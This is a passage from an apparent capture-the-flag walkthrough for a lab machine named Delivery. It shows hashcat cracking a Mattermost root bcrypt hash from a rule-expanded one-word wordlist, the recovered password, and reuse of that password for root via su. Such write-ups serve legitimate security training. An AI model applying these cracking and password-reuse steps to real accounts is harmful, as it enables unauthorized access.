There are some hashes. I focused on the `root` user's hash. This is the `root` account of the `Mattermost` site, not of the machine, but the password may be reused.

I created a wordlist with `PleaseSubscribe!` and used rules to try permutations of it.

```shell
echo "PleaseSubscribe!" > wordlist.txt

hashcat -m 3200 '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO' wordlist.txt -r /usr/share/hashcat/rules/best66.rule -O

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

It cracked, so I tried it with `su - root`:

```

root@Delivery:~# ls
```
